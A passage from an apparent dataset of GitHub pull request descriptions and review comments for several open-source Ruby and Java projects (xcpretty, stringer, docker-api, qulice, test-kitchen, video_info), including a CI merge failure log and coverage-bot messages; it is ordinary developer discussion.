rubocop** into **3c9f0c0acfe2775d5332d9b218c7351cb2ad9b2e on master**.\n']"
804,sul-dlss/spotlight,1157.0,"Fixes #1156 

Increase z-index of main menu so dropdown menu is visible over page content.

### Before

![before](https://cloud.githubusercontent.com/assets/101482/8089029/4cbf0f80-0f5a-11e5-9918-25bfc46aaa5a.png)

### After

![after](https://cloud.githubusercontent.com/assets/101482/8089057/57e35b96-0f5a-11e5-8781-c5e0cdf918b2.png)
",[]
805,supermarin/xcpretty,90.0,"If a test fails, print 3 lines of the snippet context underneath the failure.

It looks something like this:
![screen shot 2014-05-30 at 4 00 24 pm](https://cloud.githubusercontent.com/assets/627285/3137279/ee9c080e-e84f-11e3-9837-0c942d50a8fc.png)

Done in the PR:
- extract snippet logic from `html.rb` to `snippet.rb`
- make snippet 3 lines instead of 1 line
- add snippets to abstract formatter","[""i'd guess we just don't print nothing? ![](http://i.imgur.com/4tUeXiM.gif)"", 'Just checking if it crashes or anything.', '@kattrali :+1: let me write a spec and see what happens', 'It just works :) seems like it prints lines 1-2-3.\r\nLet me add one more fixture with only 1 line, that might be the last possible edge case', 'Nice!']"
806,supermarin/xcpretty,121.0,"Make `json-compilation-database` reporter compatible with `oclint-json-compilation-database` (0.9dev) :
  - ""directory"" and ""file"" are consistent (compliant with the [format spec](http://clang.llvm.org/docs/JSONCompilationDatabase.html))
  - compilation command is compatible (include a pch file path correction)
  - handle paths containing spaces, e.g. : .../Core\ Data/...
  - updated specs","[""@AliSoftware : Ruby 1.8.7 doesn't support regular expression lookbehind assertions. I missed that, sorry. Thanks for your support with lookbehind' regex.\r\ncommit [cd1bcd3](https://github.com/iKiKi/xcpretty/commit/cd1bcd3a32d6f6180614be33b35c11828df436ca) reviews regex with lookbehind assertions and add some specs to test compile directive including spaces in paths.\r\nI also relaunched in my terminal xcpretty and oclint analysis... still wortking with:\r\n```\r\nOCLint version 0.9dev.\r\nBuilt Jun 17 2014 (03:37:13)\r\n```"", ""@iKiKi @AliSoftware thank you guys for your work!\r\nI've skimmed over the changes, and it seems ok except the Swift comment.\r\nPinging @kattrali in case I've missed something"", ""Looks good to me. Nice work, @iKiKi! I'd agree that we might need to check for [swift support](https://github.com/iKiKi/xcpretty/commit/cd1bcd3a32d6f6180614be33b35c11828df436ca#diff-e57dc5211b8d88d3b6cb00df3c4eb3f0R44) but I'm otherwise good with the changes."", 'As the actual state of the project does not support Swift yet (the RegExes were already only listing extensions for ObjC & C++ but not Swift), maybe we could merge this PR, and have a new, dedicated issue to add Swift support (which would probably need separate work with dedicated specs and reviewing every regex)?', ""@AliSoftware you're actually right - we've added Swift support but only for syntax highlighting.\r\nThanks for your thoughts!""]"
807,supermarin/xcpretty,124.0,"Support output from `XCTestCase.measureBlock()` as following notated image:

[![screenshot 2015-02-07 20 45 14](https://cloud.githubusercontent.com/assets/33430/6092021/0af251ce-af0c-11e4-8ee4-c9f766b0ec0e.png)](https://travis-ci.org/norio-nomura/Base32/builds/49848814)
","[""Should I rewrite codes following hound's review?"", ""@norio-nomura i've deleted some of unneeded comments, and left some of them that are desireable to fix.\r\n\r\n\r\nThanks for your contribution, appreciate that!"", ""@norio-nomura thanks for addressing the code style guide.\r\nIt seems like the parameters got misaligned on some of these cases - it'd be awesome if you could align them before merging"", 'How about the symbol ""\xe2\x97\xb7"" for MEASURE?', 'Example of ""\xe2\x97\xb7"" used on Travis-CI will be following:\r\nhttps://travis-ci.org/norio-nomura/Base32/builds/51453875', ""@norio-nomura thanks, that looks actually good to me.\r\nI'd wait a bit to see if @kattrali is around, if not feel free to commit it.\r\n\r\nOther than that, the code is good to merge.\r\nWe'll need to add a [feature](https://github.com/supermarin/xcpretty/tree/master/features) (a frontend test), but if you feel ambitious, it'd be greatly appreciated."", ""Oh, sorry, I didn't read about `feature`.\r\nI will read Cucumber documents."", '@supermarin @norio-nomura ""\xe2\x97\xb7"" sounds perfect to me', ""It's my first writing feature.\r\nI copy and modify the PENDING cases.\r\nIt's interest."", '@norio-nomura :+1: \xf0\x9f\x98\x84', ""@norio-nomura you're awesome!"", '@supermarin @kattrali Thanks! :smile: ']"
808,supermarin/xcpretty,128.0,As discussed in #127 reopening going against master.,['Thanks @pietbrauer!']
809,supermarin/xcpretty,136.0,"Adds support for terminal capability detection for unicode and color, enabling where detected.

Fixes #70 

Thoughts?","['Updated.', ':+1: :+1: after comment', 'Are we good here?', ""Yep :) sorry I've gotten used to giving thumbs and expecting the author to merge"", ""Shouldn't these changes be reflected in the readme as well? I still find `-c` without any explanation what `-c` does."", '@angerman they should once we announce it in a release.\r\n\r\nWould you like to submit a PR?']"
810,swanson/stringer,290.0,"Currently, the action bar for a single feed is the same as the action bar for /news. So the refresh button is actually going back to /news.

So created a new single feed action bar which changes the refresh button to load the single feed page again. And added a new Back button to go back to /news.","['Done! Pls see if it is okay. Thanks!', 'Feature-wise, I think this looks good. It\'s something I\'ve been missing as well. A question though, do the ""mark all"" actions in this PR work the way we want them to? Don\'t they still mark stories from all feeds? I would\'ve expected them to mark only stories in this feed.', 'okay i removed the feed_id instance variable and corrected the indentation.. let me check on the ""mark all"" action.. might have missed that out.. \r\n\r\nthanks!', 'hmmm i looked up the ""mark all"" action again.. I understand that the stories are fetched for the feed, and then only the stories for the feed will be marked as all right? \r\n\r\ni tested manually with a couple of feeds with unread stories and it only affects the current feed being viewed.. so it should be working as we wanted?', 'Sounds good to me! @swanson, any thoughts on this before merging?', '@Koronen thanks for the time on this.. and for the patience! :)', 'Feature looks good to me. Thanks @jasonngpt \r\n\r\nRegarding ""mark all as read"" - my intention was for mark all as read to only ever effect the visible items. So if you are on a single feed view, mark all as read should only mark the unread stories from that feed.', '@jasonngpt sorry for keeping you waiting. Thanks for your contribution!', 'no worries @Koronen! thanks for merging..']"
811,swipely/docker-api,50.0,"@bfulton @nahiluhmot

We'd been slightly out of date on a few fronts so this just took care of that.  My VCR pull just got merged so this is just pending a Gem release.

This that've changed:
- Docker::Container#attach now returns both stdout and stderr strings.  Since Docker has started to mux these together, the result is a Array of Strings for each stdout and stderr
- Docker#authenticate! works and uses creds
- Docker::Event has been added for streaming events
- Docker::Image#push and Docker::Image.create both take credentials in the form of a JSON AuthConfig object (https://github.com/dotcloud/docker/blob/master/auth/auth.go#L28)
- Docker::Image.build and Docker::Image.build_from_dir take a hash of options to specify query parameters (for tagging and forcing nocache)","['@bfulton @nahiluhmot New VCR was released today so this now passes.', '@tlunter Just a few minor comments, but it otherwise looks great! :+1: ']"
812,teamed/qulice,434.0,license year updated,"['@simonjenga Thanks for your pull request, let me find someone who can review it', '@carlosmiranda please review, thanks', ""@simonjenga This PR is so big, and my comments are mostly the same, so in summary:\r\n\r\n1. Remove all other code changes not related to the `LICENSE` and submit separate PRs for them. We keep things separate on this project.\r\n2. No need to add license headers in `.properties` files.\r\n3. Do **not** change the license for files within `it/` folders, they were put in that way to test some specific quality checks.\r\n\r\nLet me know when you've pushed a new commit."", '@carlosmiranda Unnecessary code changes have been removed in this new pushed commit.\r\nOther changes will be done as needed in new PRs that will be submitted later.', '@simonjenga Thanks!', '@rultor Looks good to merge.', '> @rultor Looks good to merge.\n\n@carlosmiranda Thanks for your request. @davvd Please confirm this.', '@rultor merge please', '> @rultor merge please\n\n@carlosmiranda Thanks for your request. @yegor256 Please confirm this.', '@rultor try to merge', ""> @rultor try to merge\n\n@yegor256 OK, I'll try to merge now. You can check the progress of the merge [here](http://www.rultor.com/t/3951-115071733)"", '> @rultor try to merge\n\n@yegor256 Oops, I failed. You can see the full log [here](http://www.rultor.com/t/3951-115071733) (spent 11min)\n\n```\nINFO: ""reading qulice-maven-plugin/src/test/java/com/qulice/maven/MavenEnvironmentMocker.java...""\nINFO: ""reading qulice-maven-plugin/src/test/java/com/qulice/maven/MavenProjectMocker.java...""\nINFO: ""reading qulice-maven-plugin/src/test/java/com/qulice/maven/PomXpathValidatorTest.java...""\nINFO: ""reading qulice-maven-plugin/src/test/java/com/qulice/maven/SvnPropertiesValidatorTest.java...""\nINFO: ""reading qulice-maven-plugin/src/test/java/com/qulice/maven/ValidatorsProviderMocker.java...""\nINFO: ""reading qulice-maven-plugin/src/test/java/com/qulice/maven/package-info.java...""\nINFO: ""reading qulice-maven-plugin/src/test/resources/com/qulice/maven/PomXpathValidator/pom.xml...""\nINFO: ""reading qulice-pmd/LICENSE.txt...""\nINFO: ""reading qulice-pmd/pom.xml...""\nINFO: ""reading qulice-pmd/src/main/java/com/qulice/pmd/DataSourceReader.java...""\nINFO: ""reading qulice-pmd/src/main/java/com/qulice/pmd/Files.java...""\nINFO: ""reading qulice-pmd/src/main/java/com/qulice/pmd/PMDValidator.java...""\nINFO: ""reading qulice-pmd/src/main/java/com/qulice/pmd/PmdListener.java...""\nINFO: ""reading qulice-pmd/src/main/java/com/qulice/pmd/SourceValidator.java...""\nINFO: ""reading qulice-pmd/src/main/java/com/qulice/pmd/package-info.java...""\nINFO: ""reading qulice-pmd/src/main/java/com/qulice/pmd/rules/UnnecessaryLocalRule.java...""\nINFO: ""reading qulice-pmd/src/main/java/com/qulice/pmd/rules/package-info.java...""\nINFO: ""reading qulice-pmd/src/main/resources/com/qulice/pmd/ruleset.xml...""\nINFO: ""reading qulice-pmd/src/site/apt/index.apt.vm...""\nINFO: ""reading qulice-pmd/src/site/site.xml...""\nINFO: ""reading qulice-pmd/src/test/java/com/qulice/pmd/FilesTest.java...""\nINFO: ""reading qulice-pmd/src/test/java/com/qulice/pmd/PMDValidatorTest.java...""\nINFO: ""reading qulice-pmd/src/test/java/com/qulice/pmd/package-info.java...""\nINFO: ""reading qulice-pmd/src/test/resources/log4j.properties...""\nINFO: ""reading qulice-pmd:findbug_excludes_4934864278473998.xml...""\nINFO: ""reading qulice-spi/LICENSE.txt...""\nINFO: ""reading qulice-spi/pom.xml...""\nINFO: ""reading qulice-spi/src/main/java/com/qulice/spi/Environment.java...""\nINFO: ""reading qulice-spi/src/main/java/com/qulice/spi/ValidationException.java...""\nINFO: ""reading qulice-spi/src/main/java/com/qulice/spi/Validator.java...""\nINFO: ""reading qulice-spi/src/main/java/com/qulice/spi/package-info.java...""\nINFO: ""reading qulice-spi/src/site/apt/index.apt.vm...""\nINFO: ""reading qulice-spi/src/site/site.xml...""\nINFO: ""reading qulice-spi/src/test/java/com/qulice/spi/EnvironmentTest.java...""\nINFO: ""reading qulice-spi/src/test/java/com/qulice/spi/package-info.java...""\nINFO: ""reading qulice-xml/LICENSE.txt...""\nINFO: ""reading qulice-xml/pom.xml...""\nINFO: ""puzzle 280-4ce4d8c5 0/IMP at qulice-xml/pom.xml""\nINFO: ""reading qulice-xml/src/main/java/com/qulice/xml/Prettifier.java...""\nINFO: ""reading qulice-xml/src/main/java/com/qulice/xml/XmlValidator.java...""\nINFO: ""reading qulice-xml/src/main/java/com/qulice/xml/package-info.java...""\nINFO: ""reading qulice-xml/src/site/apt/index.apt.vm...""\nINFO: ""reading qulice-xml/src/site/site.xml...""\nINFO: ""reading qulice-xml/src/test/java/com/qulice/xml/XmlValidatorTest.java...""\nINFO: ""puzzle 246-77de21a5 0/IMP at qulice-xml/src/test/java/com/qulice/xml/XmlValidatorTest.java""\nINFO: ""reading qulice-xml/src/test/java/com/qulice/xml/package-info.java...""\nINFO: ""reading qulice-xml/src/test/resources/log4j.properties...""\nINFO: ""reading src/site/apt/index.apt.vm...""\nINFO: ""reading src/site/apt/quality.apt.vm...""\nINFO: ""reading src/site/resources/CNAME...""\nINFO: ""reading src/site/site.xml...""\nERROR: ""Element \'id\': [facet \'pattern\'] The value \'337.-8e901889\' is not accepted by the pattern \'[a-zA-Z0-9\\\\-]+\'.""\nERROR: ""Element \'id\': \'337.-8e901889\' is not a valid value of the local atomic type.""\nERROR: ""<?xml version=\\""1.0\\""?>\\n<?xml-stylesheet type=\'text/xsl\' href=\'http://pdd-xsl.teamed.io/0.14.2.xsl\'?>\\n<puzzles xmlns:xsi=\\""http://www.w3.org/2001/XMLSchema-instance\\"" xsi:noNamespaceSchemaLocation=\\""http://pdd-xsd.teamed.io/0.14.2.xsd\\"" version=\\""0.14.2\\"" date=\\""2015-06-25T02:23:53Z\\"">\\n  <puzzle>\\n    <ticket>337.</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>337.-8e901889</id>\\n    <lines>168-168</lines>\\n    <body>Implement exclude and excludes for ant QuliceTask</body>\\n    <file>qulice-ant/src/main/java/com/qulice/ant/AntEnvironment.java</file>\\n    <author>alevohin</author>\\n    <email>alevohin@mail.ru</email>\\n    <time>2015-01-19T19:18:59Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>337</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>337-3d7cb361</id>\\n    <lines>40-40</lines>\\n    <body>Implement unit tests at AntEnvironmentTest</body>\\n    <file>qulice-ant/src/test/java/com/qulice/ant/AntEnvironmentTest.java</file>\\n    <author>alevohin</author>\\n    <email>alevohin@mail.ru</email>\\n    <time>2015-01-19T19:18:59Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>260</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>260-dc51e6f4</id>\\n    <lines>50-51</lines>\\n    <body>Add handling of multiple anonymous classes inside methods by looking at the recursive tree.</body>\\n    <file>qulice-checkstyle/src/main/java/com/qulice/checkstyle/MethodBodyCommentsCheck.java</file>\\n    <author>krzyk</author>\\n    <email>Krzysztof.Krason@sabre.com</email>\\n    <time>2014-08-23T14:11:13Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>333</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>333-37771839</id>\\n    <lines>212-213</lines>\\n    <body>When new jcabi is released based on qulice &gt; 0.11, remove the line below.</body>\\n    <file>qulice-findbugs/pom.xml</file>\\n    <author>krzyk</author>\\n    <email>Krzysztof.Krason@sabre.com</email>\\n    <time>2014-11-29T07:49:29Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>339</ticket>\\n    <estimate>30</estimate>\\n    <role>IMP</role>\\n    <id>339-6f043704</id>\\n    <lines>47-47</lines>\\n    <body>Design validator classes for Gradle.</body>\\n    <file>qulice-gradle-plugin/src/main/java/com/qulice/gradle/QulicePlugin.java</file>\\n    <author>Dmitri Pisarenko</author>\\n    <email>dp@altruix.co</email>\\n    <time>2015-01-17T13:25:27Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>281</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>281-2350cdf0</id>\\n    <lines>300-306</lines>\\n    <body>Dependency-violations is broken. As it uses maven-dependency-analyzer 1.4. The latter depends on ASM3. We can\'t add ASM3 in classpath as findbugs and PMD depends on ASM5. Find a way to upgrade maven-dependency-analyzer to use ASM5. After fix uncomment next line &lt;pomInclude&gt;dependency-violations/pom.xml&lt;/pomInclude&gt;</body>\\n    <file>qulice-maven-plugin/pom.xml</file>\\n    <author>longtimeago</author>\\n    <email>ppol@ua.fm</email>\\n    <time>2014-09-02T17:42:56Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>262</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>262-9a421520</id>\\n    <lines>37-41</lines>\\n    <body>Checkstyle doesn\'t have current module in classpath (either because RedundantThrows/AbstractTypeAwareCheck have wrong implementation of resolveClass() or qulice provides wrong classpath to the module. When this is fixed uncomment following three checks and remove \\""suppressLoadErrors\\"" from RedundantThrows configuration in checks.xml.</body>\\n    <file>qulice-maven-plugin/src/it/checkstyle-exceptions/verify.groovy</file>\\n    <author>krzyk</author>\\n    <email>Krzysztof.Krason@sabre.com</email>\\n    <time>2014-06-11T10:02:14Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>352</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>352-f6cf61e2</id>\\n    <lines>51-53</lines>\\n    <body>Need to add multiline check after issue #350 resolved. Now only one class can be excluded Don\'t forget update example-exclude.apt.vm</body>\\n    <file>qulice-maven-plugin/src/it/findbugs-exclude/pom.xml</file>\\n    <author>alevohin</author>\\n    <email>alevohin@mail.ru</email>\\n    <time>2015-01-16T04:23:10Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>60</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>60-2649436b</id>\\n    <lines>36-39</lines>\\n    <body>This validation doesn\'t work at the moment because of incorrect classpath generation in DefaultMavenEnvironment. There is some problem which leads to incomplete classpath being passed to com.qulice.findbugs.Wrap class.</body>\\n    <file>qulice-maven-plugin/src/it/findbugs-violations/verify.groovy</file>\\n    <author>Yegor Bugayenko</author>\\n    <email>yegor@tpc2.com</email>\\n    <time>2012-04-02T03:12:27Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>250</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>250-70b42373</id>\\n    <lines>45-53</lines>\\n    <body>Maven-duplicate-finder-plugin should support exclusions. Let\'s add exclusions of following formats (examples): - duplicate:about.html - duplicate:org.eclipse.sisu:org.eclipse.sisu.plexus:0.0.0.M5 - duplicate:org.codehaus.groovy.ast.expr.RegexExpression - duplicate:org.eclipse.sisu:org.eclipse.sisu.plexus:0.0.0.M5|xml-apis:xml-apis:1.0.0|about.html - duplicate:org.eclipse.sisu:org.eclipse.sisu.plexus:0.0.0.M5|xml-apis:xml-apis:1.0.0|org.w3c.dom.UserDataHandler See https://github.com/tpc2/qulice/issues/152#issuecomment-39028953 and https://github.com/teamed/qulice/issues/250 for details</body>\\n    <file>qulice-maven-plugin/src/main/java/com/qulice/maven/DuplicateFinderValidator.java</file>\\n    <author>krzyk</author>\\n    <email>Krzysztof.Krason@sabre.com</email>\\n    <time>2014-06-24T19:10:43Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>250</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>250-bd6aad88</id>\\n    <lines>60-62</lines>\\n    <body>Fix a problem with maven configuration of duplicate finder plugin in commented out code below, and enable duplicate-finder-ignore-deps IT in pom.xml.</body>\\n    <file>qulice-maven-plugin/src/main/java/com/qulice/maven/DuplicateFinderValidator.java</file>\\n    <author>Yegor Bugayenko</author>\\n    <email>yegor@tpc2.com</email>\\n    <time>2014-09-04T07:09:01Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>280</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>280-4ce4d8c5</id>\\n    <lines>66-72</lines>\\n    <body>This version of jcabi-xml retries if the connection to the host of the schema document is reset. However I don\'t know how to trigger the \\""connection reset\\"" condition for testing. We should find a way to test whether it does retry if this happens. See issues https://github.com/jcabi/jcabi-xml/issues/32 and https://github.com/teamed/qulice/issues/280 for background details.</body>\\n    <file>qulice-xml/pom.xml</file>\\n    <author>Carlos Miranda</author>\\n    <email>carlosmiranda@users.noreply.github.com</email>\\n    <time>2015-01-12T13:03:58Z</time>\\n  </puzzle>\\n  <puzzle>\\n    <ticket>246</ticket>\\n    <estimate>0</estimate>\\n    <role>IMP</role>\\n    <id>246-77de21a5</id>\\n    <lines>91-95</lines>\\n    <body>XmlValidator should be able to log IO problems (for example, inability to connect to a server) and ignore them (see ticket #243).\\\\ However, {@link com.jcabi.xml.StrictXML} class outright throws an IllegalArgumentException in such cases. Let\'s find a way to detect whether a failure was caused by such IO errorsand fix this test.</body>\\n    <file>qulice-xml/src/test/java/com/qulice/xml/XmlValidatorTest.java</file>\\n    <author>Carlos Miranda</author>\\n    <email>carlosmiranda@users.noreply.github.com</email>\\n    <time>2014-08-15T02:17:27Z</time>\\n  </puzzle>\\n</puzzles>\\n""\n/var/lib/gems/1.9.1/gems/pdd-0.14.2/lib/pdd.rb:161:in `sanitize\': Element \'id\': [facet \'pattern\'] The value \'337.-8e901889\' is not accepted by the pattern \'[a-zA-Z0-9\\-]+\'.; Element \'id\': \'337.-8e901889\' is not a valid value of the local atomic type. (PDD::SchemaError)\n\tfrom /var/lib/gems/1.9.1/gems/pdd-0.14.2/lib/pdd.rb:106:in `xml\'\n\tfrom /var/lib/gems/1.9.1/gems/pdd-0.14.2/bin/pdd:90:in `<top (required)>\'\n\tfrom /usr/local/bin/pdd:23:in `load\'\n\tfrom /usr/local/bin/pdd:23:in `<main>\'\n\n```', ""@yegor256 I haven't seen this error before, could you help us?"", ""@carlosmiranda it's a problem with one of the puzzles in the branch. It is probably formatted like `@todo #337.` (with a dot)"", ""@yegor256 It's currently on master - can you fix it? https://github.com/teamed/qulice/blob/e69483e58bcb24e74a69911008d85577328bf5f1/qulice-ant/src/main/java/com/qulice/ant/AntEnvironment.java"", '@rultor try to merge', ""> @rultor try to merge\n\n@yegor256 OK, I'll try to merge now. You can check the progress of the merge [here](http://www.rultor.com/t/3951-116934691)"", '> @rultor try to merge\n\n@yegor256 Done! FYI, the full log is [here](http://www.rultor.com/t/3951-116934691) (took me 18min)', '@carlosmiranda I just added **21 mins** to your account, many thanks for your contribution (60337461).. 810 hours and 9 mins spent here. extra minutes for review comments (c=6). +21 to your rating, your total score is [+3338](http://www.netbout.com/b/35023?open=rating)', '@rultor deploy now pls', ""> @rultor deploy now pls\n\n@davvd OK, I'll try to deploy now. You can check the progress [here](http://www.rultor.com/t/3951-117563778)"", '> @rultor deploy now pls\n\n@davvd Done! FYI, the full log is [here](http://www.rultor.com/t/3951-117563778) (took me 12min)']"
813,test-kitchen/test-kitchen,427.0,"Hello friends,

So what happens when a project comes to life by inspiration and accident, then gets picked up and starts getting used in the field? Well, it's a balancing act of adding new features and tending the codebase garden so that future features are possible.

Let's call this PR a bobcat re-landscaping effort.

![bobcat](https://cloud.githubusercontent.com/assets/261548/2871103/dec95020-d2f2-11e3-846b-6d3a3cb8746d.jpg)

The goal here is backfill missing unit test coverage in critical parts of the codebase for 3 big reasons:

1. Make future [refactoring](http://c2.com/cgi/wiki?WhatIsRefactoring) quicker and lower stress. It becomes extremely expensive to properly refactor without a safety net of tests--they help enforce the previous contract for any new or modified production code.
2. Allow more safety when accepting pull requests and contributions. Once a more complete code coverage is achieved, we will start to ask for accompanying unit and/or integration tests to accompany pull requests. This benefits everyone :heart: 
3. Provide more use cases and developer documentation when navigating the codebase. Developer docs and code examples are one dimension of a successful ""documented project"".

If adding spec coverage to a ""legacy codebase"" interests you, then please follow along. If this sounds scary and tedious (and it can be), then please a glass of something tasty when this PR is finally ready for a merge.","[':+1:\r\n', '@fnichol I made a few comments inline, but overall this looks great!', ""Hey PR buddy, we're getting there\r\n\r\n![1018](https://cloud.githubusercontent.com/assets/261548/3622126/ca9cbc1a-0e28-11e4-9b0f-4a99e5d103be.gif)\r\n"", '![386](https://cloud.githubusercontent.com/assets/261548/3622993/5f8544ee-0e44-11e4-9708-3f1870e95658.gif)\r\n', '![tumblr_n0t30xkmu31qzyu6ho2_500](https://cloud.githubusercontent.com/assets/149630/3628151/1f9aae76-0e91-11e4-9635-330933cd1268.gif)\r\n', '![image](https://cloud.githubusercontent.com/assets/260553/3631014/b40045ec-0eb1-11e4-9ad1-80b19139a48d.png)\r\n', 'Done!! :cake: \r\n![1212](https://cloud.githubusercontent.com/assets/261548/3667447/98ed71f2-1204-11e4-95c5-ba9f8df0f6a2.gif)\r\n', 'Time to celebrate!\r\n\r\n![fletcher-celebrate](https://cloud.githubusercontent.com/assets/261548/3667893/a4f0b1da-120e-11e4-9f17-37c7688a0fc5.gif)\r\n', ':gift: ', "":tada: :tada: Pretty awesome!!! :tada: :tada:  I'm going to start working on my portion.. :v: ""]"
814,thibaudgg/video_info,59.0,,"['\n[![Coverage Status](https://coveralls.io/builds/1583136/badge)](https://coveralls.io/builds/1583136)\n\nCoverage decreased (-9.47%) when pulling **01c1dedaf9d2fa2b1c556120f3595c7c160659af on fuzzyjulz:master** into **c4bab7e7778091315e1ba5cf0e1fc674f353098e on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1583153/badge)](https://coveralls.io/builds/1583153)\n\nCoverage increased (+0.23%) when pulling **618151bcffea7665796ac9192a7035e084578ea7 on fuzzyjulz:master** into **c4bab7e7778091315e1ba5cf0e1fc674f353098e on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1583188/badge)](https://coveralls.io/builds/1583188)\n\nCoverage increased (+0.23%) when pulling **53150ffc183930c043a1bc57b7c5b7b12491f67b on fuzzyjulz:master** into **c4bab7e7778091315e1ba5cf0e1fc674f353098e on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1583194/badge)](https://coveralls.io/builds/1583194)\n\nCoverage increased (+0.23%) when pulling **e1d87210efa7a2546995f2232f61e640068d95cc on fuzzyjulz:master** into **c4bab7e7778091315e1ba5cf0e1fc674f353098e on thibaudgg:master**.\n', 'Thanks, 2.4.0 released!', ""No probs. I had it all there ready to go, just needed to put in the tests\r\nand it turns out some of the wistia URLS werent' previously supported -\r\nThey seem to have quite a few variations (not covered in their API docs :-(\r\n)\r\n\r\nCheers\r\n\r\nJ\r\n\r\nOn 10 December 2014 at 06:30, Thibaud Guillaume-Gentil <\r\nnotifications@github.com> wrote:\r\n\r\n> Thanks, 2.4.0 released!\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/thibaudgg/video_info/pull/59#issuecomment-66342035>.\r\n>"", ':+1:']"
815,thibaudgg/video_info,68.0,"I merged in the changes from @bonf's repository linked in #66. All I did was remove some commented out code, fix a few specs, and implemented VideoInfo.provider_api_keys hash.

All of the Youtube specs pass except '#available?', which, as far as I can tell, has something to do with SSL (thanks for that, Google...). I messed around with it for half an hour but couldn't get it to pass. 

Also, I didn't touch YoutubePlaylist yet. I think I'll be able to get to that sometime in the next few days if nobody else does.

This should merge cleanly with my other PR, #67 

Also, I left my API key in youtube_spec.rb 
You should generate your own, set it as an environment variable in Travis, and access it with ENV or something.","['\n[![Coverage Status](https://coveralls.io/builds/2527133/badge)](https://coveralls.io/builds/2527133)\n\nCoverage decreased (-0.66%) to 89.08% when pulling **572a8ff260832291cecaa7d6e631f5392e378ff0 on vheuken:youtube-fix** into **d5582b1604ab0374a94be7e692ca5267c0ea982f on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2527363/badge)](https://coveralls.io/builds/2527363)\n\nCoverage decreased (-0.65%) to 89.08% when pulling **8abdeb85f7c87415cbdb253769e10520f1dc0e5f on vheuken:youtube-fix** into **d5582b1604ab0374a94be7e692ca5267c0ea982f on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2527363/badge)](https://coveralls.io/builds/2527363)\n\nCoverage decreased (-0.65%) to 89.08% when pulling **8abdeb85f7c87415cbdb253769e10520f1dc0e5f on vheuken:youtube-fix** into **d5582b1604ab0374a94be7e692ca5267c0ea982f on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2527379/badge)](https://coveralls.io/builds/2527379)\n\nCoverage increased (+10.01%) to 99.75% when pulling **8abdeb85f7c87415cbdb253769e10520f1dc0e5f on vheuken:youtube-fix** into **d5582b1604ab0374a94be7e692ca5267c0ea982f on thibaudgg:master**.\n', ""Oh boy, merge conflicts!\r\n\r\nI'll take care of that along with the other stuff.\r\n"", 'Thanks, I just merged #67 ', 'Do you want me to fix the line too long houndci warnings?', '\n[![Coverage Status](https://coveralls.io/builds/2532810/badge)](https://coveralls.io/builds/2532810)\n\nCoverage decreased (-0.12%) to 99.88% when pulling **9da566f2d0d138b353c667595e6a1709d2e7eb16 on vheuken:youtube-fix** into **fd031d447e7e747922f331f1e5fc61663bc037ab on thibaudgg:master**.\n', ""Now it throws an ArgumentError if the key in the provider_api_keys hash isn't a symbol. Spec added, too.\r\n\r\nI think this can be merged now. I still have no idea how to handle the `#available?` issue, but this fixes the rest of the functionality."", '\n[![Coverage Status](https://coveralls.io/builds/2532808/badge)](https://coveralls.io/builds/2532808)\n\nCoverage decreased (-0.24%) to 99.76% when pulling **9da566f2d0d138b353c667595e6a1709d2e7eb16 on vheuken:youtube-fix** into **fd031d447e7e747922f331f1e5fc61663bc037ab on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2532912/badge)](https://coveralls.io/builds/2532912)\n\nCoverage decreased (-0.24%) to 99.76% when pulling **3c581dac04c53ee3ea13739ae47c77c8b6b2a3f4 on vheuken:youtube-fix** into **fd031d447e7e747922f331f1e5fc61663bc037ab on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2532912/badge)](https://coveralls.io/builds/2532912)\n\nCoverage decreased (-0.24%) to 99.76% when pulling **3c581dac04c53ee3ea13739ae47c77c8b6b2a3f4 on vheuken:youtube-fix** into **fd031d447e7e747922f331f1e5fc61663bc037ab on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2532974/badge)](https://coveralls.io/builds/2532974)\n\nCoverage decreased (-10.97%) to 89.03% when pulling **3c581dac04c53ee3ea13739ae47c77c8b6b2a3f4 on vheuken:youtube-fix** into **fd031d447e7e747922f331f1e5fc61663bc037ab on thibaudgg:master**.\n', ""Oh, I don't think I added documentation for `.provider_api_keys`. I'll do that in an hour if I don't fall asleep or ~12 hours if I do."", '@vheuken please go to sleep :smile:  :zzz: ', ""I'll do what I want!\r\n\r\nAnyway, @bonf posted a fix `#available?` and I pasted it in. Now all that is left is documentation, which will be done soon."", 'Documentation is done. I believe this can be merged now!\r\n\r\nNow all that is left is getting YoutubePlaylist fixed.', 'Er, _now_ the documentation is done...', '\n[![Coverage Status](https://coveralls.io/builds/2533465/badge)](https://coveralls.io/builds/2533465)\n\nCoverage decreased (-11.03%) to 88.97% when 